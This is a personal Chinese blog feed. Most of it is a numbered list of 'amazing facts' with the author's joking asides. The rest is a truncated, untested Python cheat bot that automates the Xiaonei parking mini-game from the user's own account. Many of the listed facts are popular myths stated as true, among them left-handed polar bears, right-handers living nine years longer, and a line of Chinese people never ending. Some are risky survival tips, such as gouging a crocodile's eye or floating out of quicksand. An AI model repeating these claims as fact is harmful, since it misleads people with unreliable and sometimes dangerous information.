<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">12.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">李小龙的动作非常快，快到看不清，所以拍电影时只好放慢胶片的速度。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">13.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">仰面躺着并缓缓地抬起双腿，可以免于陷入流沙之中。&nbsp;(去沙漠前需要重温)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">14.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">驱蚊水并不驱蚊而是干扰蚊子的感觉器官，这样它们就找不到人在哪里。</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">15.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">牙医建议，牙刷应放置于距离盥洗室至少6英尺远，以避开冲马桶时产生并漂浮于空气中的各种微粒&nbsp;。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">16.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">最早被打上条形码的产品是箭牌口香糖。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">17.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">迈克尔.乔丹每年从耐克得到的收入多于马来西亚的耐克工厂工人的薪水总和。&nbsp;(汗...难道马来西亚的NIKE比较便宜)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">18.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">玛丽莲.梦露的一只脚上有6个指头。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">19.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">希特勒的母亲曾考虑堕胎，不过被医生劝阻了。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">20.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">一生中人会脱落40磅的皮肤。&nbsp;(身体也沉迷于减肥...)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">21.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">要是不小心被鳄鱼咬到了，你就狠狠地戳它的眼球，它会放你走。&nbsp;(那如果咬到的是手或者眼睛....)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">22.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">人平均只需7分钟就可以入睡。&nbsp;(完全赶不上平均值)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">23.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">在菲律宾溜溜球曾被作为武器。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">24.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">猫是圣经里面唯一没有提到的家养动物。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">25.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">冷藏时橡皮筋可以保存得更好。&nbsp;(really?)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">26.56%的键盘录入由左手完成。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">27.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">”dreamt”是唯一以”mt”结尾的英文单词。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">28.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">即使没有头，蟑螂仍可存活10天&nbsp;。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">29.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">打喷嚏时无法睁着眼睛。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">30.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">墨西哥城每年下沉10英寸。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">31.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">睡眠时的脑比看电视时更活跃。(失眠时就去看电视.嗯)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">32.80%的美国人最喜欢蓝色。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">33.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">在这个星球上鸡比人多。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">34.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">大拇指的指甲长得最慢，中指的指甲长得最快。&nbsp;(是的,中指本身也长得最快)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">35.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">在美国华盛顿电话比人还多。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">36.48个最贫困的国家其资产总和还比不上全球最富有的三大家族。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">37.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">万宝路香烟公司的第一任老总死于肺癌。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">38.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">聪明人的头发中含有更多的锌和铜。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">39.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">世界上最年轻的父母是1910年一对中国的小孩，分别8岁和9岁。&nbsp;(OH&nbsp;MY&nbsp;GOD)　　40.出生时，我们的眼睛多大，现在还是多大。但是鼻子和耳朵一直都在长。&nbsp;(怪不得小孩都比较好看)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">41.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">睡觉时耗费的热量比看电视时还要多。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">42.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">人不睡觉大约10天就会死亡。&nbsp;(最优雅的死法)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">43.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">切洋葱时嚼口香糖就不会流泪。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">44.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">蒙娜丽莎没有眉毛。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">4</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">5.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">如果月亮正好在头顶上方，那么你的体重会稍微的减少。&nbsp;(抓紧时间,时间就是体重)　　4</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">6.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">发明了电话的亚历山大.贝尔从未给他的母亲或妻子打过电话，因为她们都失聪了。　　47.”I&nbsp;am.”是英语中最短的完整句。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">48.如同指纹，每个人的舌纹都不同。&nbsp;(以后电脑用舌纹!!)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">49.”bookkeeper”是英语中唯一一个连续3次重复字母的单词。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">50.惯用右手的人们平均比惯用左手的人们寿命长9年。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">51.”The&nbsp;quick&nbsp;brown&nbsp;fox&nbsp;jumps&nbsp;over&nbsp;the&nbsp;lazy&nbsp;dog”用到了英语中所有的字母。&nbsp;(很牛)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">52.如果所有的中国人排成一线从你面前走过，由于过高的出生率，这条线将永远没有尽头。　　53.在中国使用英语的人比美国还多。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">54.人体每平方英寸的皮肤包含有20英尺长的血管。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">55.人平均每天使用洗手间6次。(我和妈妈可以直接平均)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">56.婴儿出生时有300块骨骼，成人后只有206块。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">57.胡须是生长速度最快的人体毛发。如果一名男性从不修容，终其一生他将蓄出30英尺长&nbsp;的胡须　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">58.先有鸡还是先有蛋？根据《圣经&nbsp;创世纪&nbsp;1:20-22》，先有鸡。&nbsp;(我和圣经心心相印)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">59.仍在使用的最长的地名是：Taumatawhakatangihangaoauauotameteaturi-　　Pukakpikimaungahoronukupokaiwhenuakitanatahu，那是新西兰的一处丘陵。(图什么...)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">60.如果你早上7点乘坐飞机离开东京，那么当你到达檀香山的时候，时间是昨天下午4点半。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">61.澳大利亚帕凯斯天文台的科学家们曾以为他们接收到了来自地外文明的电波，经过调查，发现那道电波其实来自天文台里的一个微波炉。&nbsp;哈哈哈　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">62.戴耳塞一小时，耳朵里的细菌数量将是原来的700倍。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">63.一个French&nbsp;kiss可以交换超过40000个寄生虫和250种细菌。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">64.男性较女性视力好，女性较男性听力好。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">65.可口可乐最初是绿色的。&nbsp;(真的?)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">66.世界上最常见的名字是：穆罕默德。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">67.如果不把”north”和”south”算在内，在英语中，七大州的首尾字母都相同。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">68.平均每个美国人有两张信用卡。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">69.”typewriter”是用QWERTY键盘的单排按键所能够写出的最长英文单词。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">70.失明的女性是男性的两倍。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">71.人不会因为屏息而死。&nbsp;(太好了)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">72.当你打喷嚏的时候，你的心脏会停止跳动约1毫秒。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">73.猪无法看到天空。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">74.”Sixth&nbsp;sick&nbsp;sheik’s&nbsp;sixth&nbsp;sheep’s&nbsp;sick”是英语中最绕口的绕口令。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">75.过于剧烈的喷嚏会震裂肋骨，而试图憋住喷嚏将使颈部或者颅内的血管破裂从而致命。　　</span></p><p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">76.扑克牌中每个花色的K都代表着历史上的伟大君王：黑桃是大卫王，梅花是亚历山大大帝，红桃是查理大帝，方块是凯撒大帝。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">77.111,111,111&nbsp;x&nbsp;111,111,111&nbsp;=&nbsp;12,345,678,987,654,321。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">78.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">当你看到一尊骑士的雕像，如果马是四脚腾空的，那么此人战死沙场。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">79.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">同上，如果马的一只前脚抬起，那么此人因在战斗中负重伤而牺牲。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">80.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">同上，如果马的四脚皆着地，那么此人死于自然原因。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">81.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">蜂蜜不会变质。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">82.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">鳄鱼无法伸出它的舌头。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">83.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">蜗牛一觉可以睡上3年。&nbsp;(睡觉也慢...)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">84.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">所有的北极熊都是左撇子。&nbsp;(所以少活9年)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">85.1987年，美国航空公司在向头等舱提供的每份沙拉中，减少1颗橄榄，从而节省了40000&nbsp;美元。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">86.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">蝴蝶的味觉器官在它们的脚上。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">87.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">大象跳不起来。&nbsp;(哈哈,因为他善良)　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">88.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">在过去的4000年里，没有新的动物被驯养。　　</span></p>
<p style="margin-bottom: 0pt; margin-top: 0pt; text-align: justify;"><span style="font-size: 14pt; font-family: '楷体_GB2312';">89.</span><span style="font-size: 14pt; font-family: '楷体_GB2312';">一般来说，人们害怕蜘蛛胜过死亡。&nbsp;(我不是一般人)　　</span></p>
<span style="font-size: 14pt; font-family: '楷体_GB2312';">90.”assassination”和”bump”这两个词是莎士比亚创造的</span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095482343289/</guid>
    </item>
    <item>
      <title>
<![CDATA[校内抢车位外挂Python源代码[未测试]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200963192553122/</link>
      <description>
<![CDATA[#!/usr/bin/python<br>#encoding: utf-8<br>imp<wbr>ort urllib,urllib2,cookielib<br>imp<wbr>ort re,time<br>imp<wbr>ort json<br><br>class Park:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoPark = True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;autoPaste = True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def __init__(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cj=cookielib.CookieJar()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;urllib2.install_opener(opener)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def req(self,url,body=None):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;req=urllib2.Request(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if body==None:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return urllib2.urlopen(req).read()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return urllib2.urlopen(req,urllib.urlencode(body)).read()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def login(self,email,password):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url="http://login.xiaonei.com/Login.do"<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body=(("email",email),("password",password))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;uids=re.findall('http\:\/\/xiaonei\.com\/profile\.do\?id\=(\d+)',ret)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(uids)&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.uid=uids[0] <br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/getCarParkMainFrame.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;ret=self.req(url)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;pids=re.findall('\"id\"\:(.*)\}',ret)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if len(pids)&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.pid=pids[0]<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print ret.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取好友列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def listFriends(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/getFriendsCarList.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.friends=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取某个好友信息<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def showFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/ajax_car_park_get_next_page.f?pid=%s' % fid<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''获取个人汽车列表<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def getMyCar(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/ajaxGetMyCar.f'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.mycar=json.read(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''贴条<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def harvest(self,pid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/ajax_car_park_remove_car.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'pid':pid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''停车 把car听到friend的第pid个停车场<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def stopCar(self,car,friend,pid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://carpark.xiaonei.com/ajaxAddCar.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body = {'carId':car['car_id'],'carName':car['car_name'].encode('utf-8'),'free':0,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'on<wbr>lyCarId':car['uc_id'],'ownerId':self.pid,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkIdFrom':0,'parkIdTo':pid,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerIdFrom':car['user_id'], 'parkOwnerIdTo':friend['userid'],<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerNameFrom': car['user_name'].encode('utf-8'),<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;'parkOwnerNameTo': friend['user_name'].encode('utf-8')}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;raw=self.req(url,body)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if 